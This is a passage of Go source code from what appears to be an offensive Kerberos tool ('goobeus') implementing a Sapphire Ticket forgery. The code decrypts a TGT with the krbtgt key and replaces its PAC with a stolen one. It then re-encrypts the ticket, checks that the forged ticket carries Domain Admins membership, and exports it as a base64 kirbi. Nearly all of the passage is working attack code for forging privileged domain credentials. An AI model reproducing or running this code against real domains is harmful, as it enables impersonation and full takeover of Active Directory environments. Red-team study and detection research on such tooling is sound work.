			NameString: []string{req.Impersonate},
		}
		// Debug: show what's in CredInfo
		info := &newTGT.CredInfo.TicketInfo[0]
		fmt.Printf("[DEBUG] CredInfo contents:\n")
		fmt.Printf("  Key etype=%d, len=%d\n", info.Key.KeyType, len(info.Key.KeyValue))
		fmt.Printf("  PRealm=%s, PName=%v\n", info.PRealm, info.PName.NameString)
		fmt.Printf("  SRealm=%s, SName=%v\n", info.SRealm, info.SName.NameString)
	} else {
		fmt.Println("[DEBUG] WARNING: CredInfo is nil or empty")
	}

	// Debug: dump marshaled kirbi bytes
	kirbiBytes, err := newTGT.Marshal()
	if err != nil {
		fmt.Printf("[DEBUG] Marshal error: %v\n", err)
	} else {
		fmt.Printf("[DEBUG] Kirbi bytes: %d bytes, first 20: %x\n", len(kirbiBytes), kirbiBytes[:min(20, len(kirbiBytes))])
		// Dump to file for analysis
		os.WriteFile("goobeus_kirbi_debug.bin", kirbiBytes, 0600)
		fmt.Println("[DEBUG] Dumped kirbi to goobeus_kirbi_debug.bin")
	}

	// VERIFICATION: Decrypt and verify the forged ticket
	fmt.Println("[*] Verifying forged ticket...")
	if err := verifyForgedTicket(newTGT, krbtgtKey, krbtgtEtype, req.Impersonate); err != nil {
		fmt.Printf("[!] Verification WARNING: %v\n", err)
	} else {
		fmt.Println("[+] Forged ticket verification PASSED")
	}

	b64, _ := newTGT.ToBase64()

	return &SapphireTicketResult{
		Kirbi:          newTGT,
		Base64:         b64,
		OriginalUser:   req.Username,
		ImpersonatedAs: req.Impersonate,
	}, nil
}

// verifyForgedTicket decrypts and verifies the forged ticket contents
func verifyForgedTicket(kirbi *ticket.Kirbi, krbtgtKey []byte, etype int32, expectedUser string) error {
	// Use the same decryption that works for parsing the original TGT
	encTicketPart, err := decryptTGT(kirbi, krbtgtKey, etype)
	if err != nil {
		return fmt.Errorf("failed to decrypt forged ticket: %w", err)
	}

	fmt.Printf("[DEBUG] Decrypted forged ticket EncTicketPart\n")

	// Verify cname
	if len(encTicketPart.CName.NameString) > 0 {
		cname := encTicketPart.CName.NameString[0]
		if cname != expectedUser {
			fmt.Printf("[!] cname mismatch: expected '%s', got '%s'\n", expectedUser, cname)
		} else {
			fmt.Printf("[+] cname verified: %s\n", cname)
		}
	} else {
		fmt.Printf("[!] cname is empty\n")
	}

	// Verify AuthorizationData
	fmt.Printf("[DEBUG] AuthorizationData in forged ticket: %d entries\n", len(encTicketPart.AuthorizationData))
	for i, ad := range encTicketPart.AuthorizationData {
		fmt.Printf("[DEBUG]   [%d] ADType=%d, DataLen=%d\n", i, ad.ADType, len(ad.ADData))
	}

	// Extract PAC from AuthorizationData
	pacData := findPACInAuthData(encTicketPart.AuthorizationData)
	if len(pacData) == 0 {
		return fmt.Errorf("no PAC found in forged ticket AuthorizationData")
	}
	fmt.Printf("[+] PAC found in forged ticket: %d bytes\n", len(pacData))

	// Decode PAC and show groups
	decodedPAC, err := pac.DecodePAC(pacData)
	if err != nil {
		return fmt.Errorf("failed to decode PAC: %w", err)
	}

	fmt.Printf("[+] Forged ticket PAC verification:\n")
	fmt.Printf("    User SID:      %s\n", decodedPAC.UserSID)
	fmt.Printf("    Domain Admin:  %v\n", decodedPAC.IsDomainAdmin)
	fmt.Printf("    Groups (%d):   ", len(decodedPAC.Groups))
	for i, g := range decodedPAC.Groups {
		if i > 0 {
			fmt.Printf(", ")
		}
		// Just show RID
		parts := strings.Split(g, "-")
		if len(parts) > 0 {
			fmt.Printf("%s", parts[len(parts)-1])
		}
	}
	fmt.Println()

	if !decodedPAC.IsDomainAdmin {
		return fmt.Errorf("forged ticket PAC does NOT contain Domain Admins!")
	}

	return nil
}

// extractCNameFromEncTicketPart extracts the client name from decrypted EncTicketPart
func extractCNameFromEncTicketPart(data []byte) string {
	// EncTicketPart ::= [APPLICATION 3] SEQUENCE { ... [3] cname PrincipalName ... }
	if len(data) < 20 {
		return ""
	}

	// Skip APPLICATION 3 header
	pos := 0
	if data[0] == 0x63 { // APPLICATION 3
		pos = 2
		if data[1] == 0x82 {
			pos = 4
		} else if data[1] == 0x81 {
			pos = 3
		}
	}

	// Skip SEQUENCE header
	if pos < len(data) && data[pos] == 0x30 {
		if data[pos+1] == 0x82 {
			pos += 4
		} else if data[pos+1] == 0x81 {
			pos += 3
		} else {
			pos += 2
		}
	}

	// Find [3] cname
	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if pos+1 < len(data) && data[pos+1] == 0x82 {
			if pos+3 < len(data) {
				fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			}
			contentPos = pos + 4
		} else if pos+1 < len(data) && data[pos+1] == 0x81 {
			if pos+2 < len(data) {
				fieldLen = int(data[pos+2])
			}
			contentPos = pos + 3
		} else if pos+1 < len(data) && data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		if contentPos+fieldLen > len(data) {
			break
		}

		if tag == 3 { // cname - PrincipalName
			fieldData := data[contentPos : contentPos+fieldLen]
			return extractPrincipalNameString(fieldData)
		}

		pos = contentPos + fieldLen
	}
	return ""
}

// extractPrincipalNameString extracts name-string from PrincipalName
func extractPrincipalNameString(data []byte) string {
	// PrincipalName ::= SEQUENCE { [0] name-type, [1] name-string SEQUENCE OF GeneralString }
	if len(data) < 5 || data[0] != 0x30 {
		return ""
	}

	seqPos := 2
	if data[1] >= 0x80 {
		seqPos = 2 + int(data[1]&0x7f)
	}

	for seqPos < len(data)-3 {
		if data[seqPos] == 0xa1 { // [1] name-string
			innerStart := seqPos + 2
			if data[seqPos+1] >= 0x80 {
				innerStart = seqPos + 3
			}
			if innerStart < len(data) && data[innerStart] == 0x30 {
				stringsStart := innerStart + 2
				if data[innerStart+1] >= 0x80 {
					stringsStart = innerStart + 2 + int(data[innerStart+1]&0x7f)
				}
				if stringsStart < len(data)-2 {
					if data[stringsStart] == 0x1b || data[stringsStart] == 0x13 {
						strLen := int(data[stringsStart+1])
						if stringsStart+2+strLen <= len(data) {
							return string(data[stringsStart+2 : stringsStart+2+strLen])
						}
					}
				}
			}
			break
		}
		seqPos++
	}
	return ""
}

// findPACInEncTicketPart finds the PAC in decrypted EncTicketPart
func findPACInEncTicketPart(data []byte) []byte {
	// EncTicketPart ::= [APPLICATION 3] SEQUENCE { ... [10] authorization-data ... }
	if len(data) < 20 {
		return nil
	}

	// Skip APPLICATION 3 header
	pos := 0
	if data[0] == 0x63 { // APPLICATION 3
		pos = 2
		if data[1] == 0x82 {
			pos = 4
		} else if data[1] == 0x81 {
			pos = 3
		}
	}

	// Skip SEQUENCE header
	if pos < len(data) && data[pos] == 0x30 {
		if data[pos+1] == 0x82 {
			pos += 4
		} else if data[pos+1] == 0x81 {
			pos += 3
		} else {
			pos += 2
		}
	}

	// Find [10] authorization-data
	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if pos+1 < len(data) && data[pos+1] == 0x82 {
			if pos+3 < len(data) {
				fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			}
			contentPos = pos + 4
		} else if pos+1 < len(data) && data[pos+1] == 0x81 {
			if pos+2 < len(data) {
				fieldLen = int(data[pos+2])
			}
			contentPos = pos + 3
		} else if pos+1 < len(data) && data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		if contentPos+fieldLen > len(data) {
			break
		}

		if tag == 10 { // authorization-data
			return verifyFindPACInAuthData(data[contentPos : contentPos+fieldLen])
		}

		pos = contentPos + fieldLen
	}
	return nil
}

// verifyFindPACInAuthData finds AD-WIN2K-PAC (type 128) in authorization-data bytes for verification
func verifyFindPACInAuthData(data []byte) []byte {
	// AuthorizationData ::= SEQUENCE OF SEQUENCE { ad-type, ad-data }
	if len(data) < 5 || data[0] != 0x30 {
		return nil
	}

	seqPos := 2
	if data[1] >= 0x80 {
		seqPos = 2 + int(data[1]&0x7f)
	}

	for seqPos < len(data)-4 {
		if data[seqPos] != 0x30 {
			break
		}
		innerLen := 0
		innerStart := seqPos + 2
		if data[seqPos+1] >= 0x80 {
			innerLen = int(data[seqPos+2])
			innerStart = seqPos + 3
		} else {
			innerLen = int(data[seqPos+1])
		}

		if innerStart+innerLen > len(data) {
			break
		}

		innerData := data[innerStart : innerStart+innerLen]
		// Look for [0] ad-type and [1] ad-data
		adType := 0
		var adData []byte

		iPos := 0
		for iPos < len(innerData)-4 {
			if innerData[iPos] == 0xa0 && innerData[iPos+2] == 0x02 { // [0] ad-type INTEGER
				adType = int(innerData[iPos+4])
				iPos += int(innerData[iPos+1]) + 2
			} else if innerData[iPos] == 0xa1 { // [1] ad-data
				dataLen := 0
				dataStart := iPos + 2
				if innerData[iPos+1] >= 0x80 {
					dataLen = int(innerData[iPos+2])
					dataStart = iPos + 3
				} else {
					dataLen = int(innerData[iPos+1])
				}
				if dataStart+dataLen <= len(innerData) {
					// Skip OCTET STRING tag
					if innerData[dataStart] == 0x04 {
						octetLen := 0
						octetStart := dataStart + 2
						if innerData[dataStart+1] >= 0x80 {
							octetLen = int(innerData[dataStart+2])
							octetStart = dataStart + 3
						} else {
							octetLen = int(innerData[dataStart+1])
						}
						if octetStart+octetLen <= len(innerData) {
							adData = innerData[octetStart : octetStart+octetLen]
						}
					}
				}
				break
			} else {
				iPos++
			}
		}

		if adType == 128 { // AD-WIN2K-PAC
			return adData
		} else if adType == 1 { // AD-IF-RELEVANT - recurse
			if found := verifyFindPACInAuthData(adData); found != nil {
				return found
			}
		}

		seqPos = innerStart + innerLen
	}
	return nil
}
func extractPACFromTicket(kirbi *ticket.Kirbi, sessionKey []byte) ([]byte, error) {
	if kirbi == nil || kirbi.Cred == nil || len(kirbi.Cred.Tickets) == 0 {
		return nil, fmt.Errorf("no ticket in kirbi")
	}

	// Get the raw ticket bytes - use RawBytes if available
	var ticketRaw []byte
	if len(kirbi.Cred.Tickets[0].RawBytes) > 0 {
		ticketRaw = kirbi.Cred.Tickets[0].RawBytes
	} else {
		// Fall back to Marshal if no RawBytes
		var err error
		ticketRaw, err = kirbi.Cred.Tickets[0].Marshal()
		if err != nil {
			return nil, fmt.Errorf("failed to marshal ticket: %w", err)
		}
	}

	fmt.Printf("[DEBUG] extractPAC: ticket raw %d bytes, first10: %x\n", len(ticketRaw), ticketRaw[:min(10, len(ticketRaw))])

	// Extract enc-part from ticket manually (avoid Go asn1 GeneralString issues)
	// Ticket ::= APPLICATION 1 -> SEQUENCE { [0] tkt-vno, [1] realm, [2] sname, [3] enc-part }
	etype, cipher, err := extractTicketEncPart(ticketRaw)
	if err != nil {
		return nil, fmt.Errorf("failed to extract ticket enc-part: %w", err)
	}

	// Decrypt EncTicketPart with sessionKey or KDC key
	// For S4U2Self+U2U, the ticket is encrypted with TGT session key (key usage 2)
	decrypted, err := decryptWithKey(cipher, sessionKey, 2, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt ticket: %w", err)
	}

	// Parse EncTicketPart (apply GeneralString workaround)
	decryptedFixed := make([]byte, len(decrypted))
	copy(decryptedFixed, decrypted)
	for i := range decryptedFixed {
		if decryptedFixed[i] == 0x1b {
			decryptedFixed[i] = 0x13
		}
	}

	fmt.Printf("[DEBUG] Decrypted EncTicketPart: %d bytes, first 15: %x\n", len(decrypted), decrypted[:min(15, len(decrypted))])

	var encTicketPart asn1krb5.EncTicketPart

	// Skip APPLICATION 3 header (0x63)
	parseData := decryptedFixed
	if decryptedFixed[0] == 0x63 {
		// APPLICATION 3 tag, skip it
		headerLen := 2
		if decryptedFixed[1] == 0x82 {
			headerLen = 4
		} else if decryptedFixed[1] == 0x81 {
			headerLen = 3
		}
		parseData = decryptedFixed[headerLen:]
	}

	_, err = asn1.Unmarshal(parseData, &encTicketPart)
	if err != nil {
		return nil, fmt.Errorf("failed to parse EncTicketPart: %w", err)
	}

	// Find PAC in authorization-data
	pacData := findPACInAuthData(encTicketPart.AuthorizationData)
	if pacData == nil {
		return nil, fmt.Errorf("PAC not found in ticket")
	}

	return pacData, nil
}

// decryptTGT decrypts the TGT with krbtgt key
func decryptTGT(tgt *ticket.Kirbi, krbtgtKey []byte, etype int32) (*asn1krb5.EncTicketPart, error) {
	if tgt == nil || tgt.Cred == nil || len(tgt.Cred.Tickets) == 0 {
		return nil, fmt.Errorf("invalid TGT")
	}

	// Get raw ticket bytes - use RawBytes if available
	var ticketRaw []byte
	if len(tgt.Cred.Tickets[0].RawBytes) > 0 {
		ticketRaw = tgt.Cred.Tickets[0].RawBytes
	} else {
		var err error
		ticketRaw, err = tgt.Cred.Tickets[0].Marshal()
		if err != nil {
			return nil, fmt.Errorf("failed to marshal TGT ticket: %w", err)
		}
	}

	// Extract enc-part from ticket manually
	_, cipher, err := extractTicketEncPart(ticketRaw)
	if err != nil {
		return nil, fmt.Errorf("failed to extract TGT enc-part: %w", err)
	}

	// Decrypt with krbtgt key
	decrypted, err := decryptWithKey(cipher, krbtgtKey, 2, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGT with krbtgt key: %w", err)
	}

	// Apply GeneralString workaround - ONLY for actual string tags, NOT binary data
	// 0x1b (GeneralString tag) can appear naturally in binary PAC data, so we must only
	// replace it when it appears as an actual ASN.1 tag followed by valid string length
	decryptedFixed := fixGeneralStringForParsing(decrypted)

	// Skip APPLICATION 3 header (0x63)
	parseData := decryptedFixed
	if decryptedFixed[0] == 0x63 {
		headerLen := 2
		if decryptedFixed[1] == 0x82 {
			headerLen = 4
		} else if decryptedFixed[1] == 0x81 {
			headerLen = 3
		}
		parseData = decryptedFixed[headerLen:]
	}

	var encTicketPart asn1krb5.EncTicketPart
	_, err = asn1.Unmarshal(parseData, &encTicketPart)
	if err != nil {
		return nil, fmt.Errorf("failed to parse TGT EncTicketPart: %w", err)
	}

	return &encTicketPart, nil
}

// decryptTGTRaw decrypts the TGT with krbtgt key and returns the ORIGINAL decrypted bytes
// This is critical to avoid GeneralString encoding issues with Go's asn1 package
func decryptTGTRaw(tgt *ticket.Kirbi, krbtgtKey []byte, etype int32) ([]byte, error) {
	if tgt == nil || tgt.Cred == nil || len(tgt.Cred.Tickets) == 0 {
		return nil, fmt.Errorf("invalid TGT")
	}

	// Get raw ticket bytes
	var ticketRaw []byte
	if len(tgt.Cred.Tickets[0].RawBytes) > 0 {
		ticketRaw = tgt.Cred.Tickets[0].RawBytes
	} else {
		var err error
		ticketRaw, err = tgt.Cred.Tickets[0].Marshal()
		if err != nil {
			return nil, fmt.Errorf("failed to marshal TGT ticket: %w", err)
		}
	}

	// Extract enc-part from ticket
	_, cipher, err := extractTicketEncPart(ticketRaw)
	if err != nil {
		return nil, fmt.Errorf("failed to extract TGT enc-part: %w", err)
	}

	// Decrypt with krbtgt key - return the original bytes without any modification!
	decrypted, err := decryptWithKey(cipher, krbtgtKey, 2, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGT with krbtgt key: %w", err)
	}

	return decrypted, nil
}

// replacePACInRawBytes replaces the PAC in raw EncTicketPart bytes
// This preserves all GeneralString encoding to avoid KDC rejection
func replacePACInRawBytes(encTicketPartBytes []byte, newPAC []byte) ([]byte, error) {
	// Find the authorization-data field in EncTicketPart
	// Structure: SEQUENCE { [0] flags, [1] key, [2] crealm, [3] cname, [4] transited, [5] authtime, ... [10] authorization-data }
	// We need to find the PAC within [10] authorization-data

	data := encTicketPartBytes

	// Skip APPLICATION 3 header if present (EncTicketPart)
	if data[0] == 0x63 {
		headerLen := 2
		if data[1] == 0x82 {
			headerLen = 4
		} else if data[1] == 0x81 {
			headerLen = 3
		}
		data = data[headerLen:]
	}

	// Skip SEQUENCE header
	if data[0] != 0x30 {
		return nil, fmt.Errorf("expected SEQUENCE, got 0x%02x", data[0])
	}
	seqHeaderLen := 2
	if data[1] == 0x82 {
		seqHeaderLen = 4
	} else if data[1] == 0x81 {
		seqHeaderLen = 3
	}

	// Find [10] authorization-data (0xaa)
	pos := seqHeaderLen
	authDataStart := 0
	authDataEnd := 0

	for pos < len(data) {
		if data[pos] < 0xa0 || data[pos] > 0xaf {
			break
		}

		tag := data[pos]
		fieldLen := 0
		headerLen := 2

		if data[pos+1] == 0x82 {
			fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			headerLen = 4
		} else if data[pos+1] == 0x81 {
			fieldLen = int(data[pos+2])
			headerLen = 3
		} else if data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		totalFieldLen := headerLen + fieldLen

		if tag == 0xaa { // [10] authorization-data
			authDataStart = pos
			authDataEnd = pos + totalFieldLen
			break
		}

		pos += totalFieldLen
	}

	if authDataStart == 0 {
		return nil, fmt.Errorf("authorization-data [10] not found")
	}

	// Now find the PAC (AD-WIN2K-PAC type 128 = 0x80) within authorization-data
	// We need to find the OCTET STRING containing the PAC and replace its content

	// The structure is: [10] { SEQUENCE OF { SEQUENCE { [0] ad-type, [1] ad-data } } }
	// For AD-IF-RELEVANT (type 1), ad-data contains nested AuthorizationData
	// For AD-WIN2K-PAC (type 128), ad-data contains the PAC bytes

	// Find PAC bytes location
	authDataBytes := data[authDataStart:authDataEnd]
	pacStart, pacEnd, err := findPACInAuthDataBytes(authDataBytes)
	if err != nil {
		// Fall back to finding raw PAC bytes directly
		_ = pacStart
		_ = pacEnd
	}

	// Find the exact PAC bytes and replace them directly
	pacBytes, pacOffset, err := findRawPACBytes(encTicketPartBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to find raw PAC bytes: %w", err)
	}

	if len(pacBytes) == len(newPAC) {
		// Same size - simple in-place replacement
		result := make([]byte, len(encTicketPartBytes))
		copy(result, encTicketPartBytes)
		copy(result[pacOffset:], newPAC)
		return result, nil
	}

	// Different sizes - need to rebuild authorization-data with new length
	// Find the OCTET STRING header that wraps the PAC
	octetStringStart := findOctetStringHeaderForPAC(encTicketPartBytes, pacOffset)
	if octetStringStart < 0 {
		return nil, fmt.Errorf("could not find OCTET STRING header for PAC")
	}

	// Build new OCTET STRING with the new PAC
	newOctetString := []byte{0x04} // OCTET STRING tag
	newOctetString = append(newOctetString, buildLen(len(newPAC))...)
	newOctetString = append(newOctetString, newPAC...)

	// Calculate the old OCTET STRING length
	oldOctetStringHeaderLen := 2
	if encTicketPartBytes[octetStringStart+1] == 0x82 {
		oldOctetStringHeaderLen = 4
	} else if encTicketPartBytes[octetStringStart+1] == 0x81 {
		oldOctetStringHeaderLen = 3
	}
	oldOctetStringTotalLen := oldOctetStringHeaderLen + len(pacBytes)

	// Splice in the new OCTET STRING
	prefix := encTicketPartBytes[:octetStringStart]
	suffix := encTicketPartBytes[octetStringStart+oldOctetStringTotalLen:]

	// Build initial result
	result := append(prefix, newOctetString...)
	result = append(result, suffix...)

	// Now we need to update all the parent length fields
	// This is where it gets complex...
	// We need to adjust the lengths of:
	// 1. The [1] ad-data wrapper
	// 2. The SEQUENCE wrapper for the AuthorizationDataEntry
	// 3. Possibly AD-IF-RELEVANT wrapper
	// 4. The [10] authorization-data wrapper
	// 5. The SEQUENCE wrapper for EncTicketPart
	// 6. The APPLICATION 3 wrapper

	sizeDiff := len(newPAC) - len(pacBytes)

	// This is extremely complex to do correctly on raw bytes
	// Because length fields can change from 1-byte to 2-byte to 3-byte format
	// Let's use a simpler approach: rebuild the entire structure from scratch
	// keeping only the data we care about

	// For now, try to update in place if the size difference is small
	// and length encoding doesn't change format
	if sizeDiff != 0 {
		// Full rebuild needed - not yet implemented
		// Fall back to struct approach with GeneralString workaround
		return nil, fmt.Errorf("PAC size mismatch: old=%d new=%d - need full rebuild", len(pacBytes), len(newPAC))
	}

	return result, nil
}

// findOctetStringHeaderForPAC finds the start of the OCTET STRING that contains the PAC
func findOctetStringHeaderForPAC(data []byte, pacOffset int) int {
	// Search backwards from pacOffset to find 0x04 (OCTET STRING tag)
	for i := pacOffset - 1; i >= 0 && i > pacOffset-10; i-- {
		if data[i] == 0x04 {
			// Verify this is the right OCTET STRING
			lenStart := i + 1
			contentStart := 0
			if data[lenStart] == 0x82 {
				contentStart = lenStart + 3
			} else if data[lenStart] == 0x81 {
				contentStart = lenStart + 2
			} else if data[lenStart] < 0x80 {
				contentStart = lenStart + 1
			} else {
				continue
			}
			if contentStart == pacOffset {
				return i
			}
		}
	}
	return -1
}

// findRawPACBytes finds the PAC bytes and their offset in EncTicketPart
func findRawPACBytes(data []byte) ([]byte, int, error) {
	// Search for the pattern: AD-WIN2K-PAC type (0x80 = 128 as INTEGER)
	// Then the ad-data OCTET STRING containing the PAC

	// PAC starts with: 05 00 00 00 (cBuffers = 5, little-endian) or similar small number
	// Search for this pattern following an OCTET STRING header

	for i := 0; i < len(data)-10; i++ {
		// Look for OCTET STRING (0x04) followed by length, then PAC header
		if data[i] == 0x04 {
			// Get OCTET STRING length
			lenStart := i + 1
			octetLen := 0
			contentStart := 0

			if data[lenStart] == 0x82 {
				octetLen = (int(data[lenStart+1]) << 8) | int(data[lenStart+2])
				contentStart = lenStart + 3
			} else if data[lenStart] == 0x81 {
				octetLen = int(data[lenStart+1])
				contentStart = lenStart + 2
			} else if data[lenStart] < 0x80 {
				octetLen = int(data[lenStart])
				contentStart = lenStart + 1
			} else {
				continue
			}

			if contentStart+8 > len(data) {
				continue
			}

			// Check if this looks like a PAC (starts with small number of buffers + version 0)
			possiblePAC := data[contentStart:]
			if len(possiblePAC) >= 8 {
				cBuffers := int(possiblePAC[0]) | int(possiblePAC[1])<<8 | int(possiblePAC[2])<<16 | int(possiblePAC[3])<<24
				version := int(possiblePAC[4]) | int(possiblePAC[5])<<8 | int(possiblePAC[6])<<16 | int(possiblePAC[7])<<24

				// PAC typically has 3-10 buffers and version 0
				if cBuffers >= 1 && cBuffers <= 20 && version == 0 {
					return data[contentStart : contentStart+octetLen], contentStart, nil
				}
			}
		}
	}

	return nil, 0, fmt.Errorf("PAC not found in data")
}

// Stub for complex auth-data parsing - not fully implemented
func findPACInAuthDataBytes(authData []byte) (int, int, error) {
	return 0, 0, fmt.Errorf("not implemented - use findRawPACBytes instead")
}

// fixPrintableToGeneralString converts PrintableString (0x13) tags to GeneralString (0x1b) in ASN.1 data
// This is needed because Go's asn1.Marshal uses PrintableString but Kerberos requires GeneralString
// for realm and principal name components.
//
// EDUCATIONAL: ASN.1 String Types in Kerberos
// RFC 4120 specifies that Realm and PrincipalName components use GeneralString (0x1b).
// However, Go's encoding/asn1 package marshals strings as PrintableString (0x13) by default.
// Windows KDC implementations strictly validate the string type tags, so we must convert.
//
// This function walks the ASN.1 structure to only replace actual type tags, not content bytes.
func fixPrintableToGeneralString(data []byte) []byte {
	result := make([]byte, len(data))
	copy(result, data)

	// Walk the ASN.1 structure and replace PrintableString tags with GeneralString
	fixASN1StringTags(result, 0)

	return result
}

// fixASN1StringTags recursively walks ASN.1 structure and fixes string type tags
func fixASN1StringTags(data []byte, offset int) {
	if offset >= len(data) {
		return
	}

	for offset < len(data) {
		if offset >= len(data) {
			return
		}

		tag := data[offset]

		// Get length
		if offset+1 >= len(data) {
			return
		}
		lenByte := data[offset+1]
		contentLen := 0
		contentStart := offset + 2

		if lenByte == 0x82 {
			if offset+3 >= len(data) {
				return
			}
			contentLen = (int(data[offset+2]) << 8) | int(data[offset+3])
			contentStart = offset + 4
		} else if lenByte == 0x81 {
			if offset+2 >= len(data) {
				return
			}
			contentLen = int(data[offset+2])
			contentStart = offset + 3
		} else if lenByte < 0x80 {
			contentLen = int(lenByte)
		} else {
			// Invalid length encoding, skip
			return
		}

		if contentStart+contentLen > len(data) {
			return
		}

		// If this is PrintableString (0x13), convert to GeneralString (0x1b)
		if tag == 0x13 {
			data[offset] = 0x1b
		}

		// If this is a constructed type (SEQUENCE, SET, or context-specific), recurse into content
		isConstructed := (tag&0x20) != 0 || tag == 0x30 || tag == 0x31 || (tag >= 0xa0 && tag <= 0xbf)
		if isConstructed && contentLen > 0 {
			fixASN1StringTags(data, contentStart)
		}

		// Move to next element
		offset = contentStart + contentLen
	}
}

// replacePAC replaces the PAC in EncTicketPart with the stolen PAC
func replacePAC(encPart *asn1krb5.EncTicketPart, newPAC []byte) (*asn1krb5.EncTicketPart, error) {
	// Create copy
	modified := *encPart

	// Replace PAC in AuthorizationData
	modified.AuthorizationData = replacePACInAuthData(encPart.AuthorizationData, newPAC)

	return &modified, nil
}

// rebuildTGT re-encrypts the modified EncTicketPart and rebuilds the kirbi
func rebuildTGT(originalTGT *ticket.Kirbi, modifiedEncPart *asn1krb5.EncTicketPart, krbtgtKey []byte, etype int32) (*ticket.Kirbi, error) {
	// Marshal the modified EncTicketPart
	encPartBytes, err := asn1.MarshalWithParams(*modifiedEncPart, "application,tag:3")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal EncTicketPart: %w", err)
	}

	// Encrypt with krbtgt key
	encrypted, err := encryptWithEtype(encPartBytes, krbtgtKey, 2, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt EncTicketPart: %w", err)
	}

	// Rebuild the ticket with new enc-part
	// We need to replace the cipher bytes in the raw ticket
	var ticketRaw []byte
	if len(originalTGT.Cred.Tickets[0].RawBytes) > 0 {
		ticketRaw = originalTGT.Cred.Tickets[0].RawBytes
	} else {
		ticketRaw, err = originalTGT.Cred.Tickets[0].Marshal()
		if err != nil {
			return nil, fmt.Errorf("failed to marshal original ticket: %w", err)
		}
	}

	// Build new ticket with updated cipher
	newTicketBytes, err := replaceTicketCipher(ticketRaw, encrypted, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to replace ticket cipher: %w", err)
	}

	// Create new Kirbi with updated ticket
	newKirbi := *originalTGT
	if newKirbi.Cred != nil {
		newCred := *newKirbi.Cred
		newCred.Tickets = make([]asn1krb5.Ticket, 1)
		newCred.Tickets[0].RawBytes = newTicketBytes
		newCred.Tickets[0].EncPart.Cipher = encrypted
		newCred.Tickets[0].EncPart.EType = etype
		newKirbi.Cred = &newCred
	}

	return &newKirbi, nil
}

// rebuildTGTFromRawBytes re-encrypts raw EncTicketPart bytes and rebuilds the kirbi
// This version takes raw bytes directly to avoid Go asn1 GeneralString issues
func rebuildTGTFromRawBytes(originalTGT *ticket.Kirbi, encTicketPartBytes []byte, krbtgtKey []byte, etype int32) (*ticket.Kirbi, error) {
	// Encrypt with krbtgt key (key usage 2)
	encrypted, err := encryptWithEtype(encTicketPartBytes, krbtgtKey, 2, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt EncTicketPart: %w", err)
	}

	// Rebuild the ticket with new enc-part
	// We need to replace the cipher bytes in the raw ticket
	var ticketRaw []byte
	if len(originalTGT.Cred.Tickets[0].RawBytes) > 0 {
		ticketRaw = originalTGT.Cred.Tickets[0].RawBytes
	} else {
		ticketRaw, err = originalTGT.Cred.Tickets[0].Marshal()
		if err != nil {
			return nil, fmt.Errorf("failed to marshal original ticket: %w", err)
		}
	}

	// Build new ticket with updated cipher
	newTicketBytes, err := replaceTicketCipher(ticketRaw, encrypted, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to replace ticket cipher: %w", err)
	}

	// Create new Kirbi with updated ticket
	newKirbi := *originalTGT
	// CRITICAL: Clear RawBytes so Marshal() uses struct fields instead
	newKirbi.RawBytes = nil

	if newKirbi.Cred != nil {
		newCred := *newKirbi.Cred
		newCred.Tickets = make([]asn1krb5.Ticket, 1)

		// CRITICAL: Copy all fields from original ticket, then update enc-part
		origTicket := originalTGT.Cred.Tickets[0]
		newCred.Tickets[0].TktVno = origTicket.TktVno
		newCred.Tickets[0].Realm = origTicket.Realm
		newCred.Tickets[0].SName = origTicket.SName
		newCred.Tickets[0].RawBytes = newTicketBytes
		newCred.Tickets[0].EncPart.EType = etype
		newCred.Tickets[0].EncPart.Cipher = encrypted
		newCred.Tickets[0].EncPart.Kvno = origTicket.EncPart.Kvno

		// CRITICAL: Clear the KRB-CRED EncPart cipher so Marshal() rebuilds from CredInfo
		// This ensures Windows gets a valid KRB-CRED structure with the session key
		newCred.EncPart.Cipher = nil
		newCred.EncPart.EType = 0

		newKirbi.Cred = &newCred
	}

	return &newKirbi, nil
}

// findPACInAuthData extracts PAC from authorization-data
func findPACInAuthData(authData asn1krb5.AuthorizationData) []byte {
	for _, ad := range authData {
		if ad.ADType == 1 { // AD-IF-RELEVANT
			// Parse nested authorization-data
			var nested asn1krb5.AuthorizationData
			_, err := asn1.Unmarshal(ad.ADData, &nested)
			if err == nil {
				found := findPACInAuthData(nested)
				if found != nil {
					return found
				}
			}
		} else if ad.ADType == 128 { // AD-WIN2K-PAC
			return ad.ADData
		}
	}
	return nil
}

// replacePACInAuthData replaces the PAC in authorization-data
func replacePACInAuthData(authData asn1krb5.AuthorizationData, newPAC []byte) asn1krb5.AuthorizationData {
	result := make(asn1krb5.AuthorizationData, len(authData))
	for i, ad := range authData {
		if ad.ADType == 1 { // AD-IF-RELEVANT
			// Parse and recursively replace
			var nested asn1krb5.AuthorizationData
			_, err := asn1.Unmarshal(ad.ADData, &nested)
			if err == nil {
				replaced := replacePACInAuthData(nested, newPAC)
				newData, _ := asn1.Marshal(replaced)
				result[i] = asn1krb5.AuthorizationDataEntry{
					ADType: 1,
					ADData: newData,
				}
			} else {
				result[i] = ad
			}
		} else if ad.ADType == 128 { // AD-WIN2K-PAC
			result[i] = asn1krb5.AuthorizationDataEntry{
				ADType: 128,
				ADData: newPAC,
			}
		} else {
			result[i] = ad
		}
	}
	return result
}

// decryptWithKey decrypts data using the appropriate etype
func decryptWithKey(ciphertext, key []byte, usage int, etype int32) ([]byte, error) {
	switch etype {
	case crypto.EtypeAES256, crypto.EtypeAES128:
		return crypto.DecryptAES(key, ciphertext, usage, int(etype))
	case crypto.EtypeRC4:
